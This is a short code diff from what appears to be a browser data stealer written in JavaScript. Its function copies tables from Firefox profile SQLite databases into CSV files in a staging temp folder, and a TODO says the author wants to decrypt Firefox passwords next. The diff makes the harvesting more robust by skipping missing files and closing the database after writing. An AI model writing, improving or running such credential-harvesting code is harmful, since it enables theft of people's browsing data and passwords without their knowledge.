@@ -36,6 +36,7 @@ const _ = (name, path, use, filename, dbData, profile = 'Default') => {
 
 const _ff = (path, profile, filename, use, columns, table) => {
   path = join(path, profile, `${use}.sqlite`);
+  if (!existsSync(path)) return;
 
   const db = new sqlite3.Database(path, sqlite3.OPEN_READONLY);
   const file = join(tempFolder, 'Browsers', 'Mozilla Firefox', `${filename}.csv`);
@@ -50,7 +51,8 @@ const _ff = (path, profile, filename, use, columns, table) => {
       csvFile.write(row);
     });
   });
-  csvFile.pipe(fs.createWriteStream(file));
+
+  csvFile.pipe(fs.createWriteStream(file)).on('finish', () => db.close());
 };
 
 // TODO: find a way to decrypt Firefox passwords
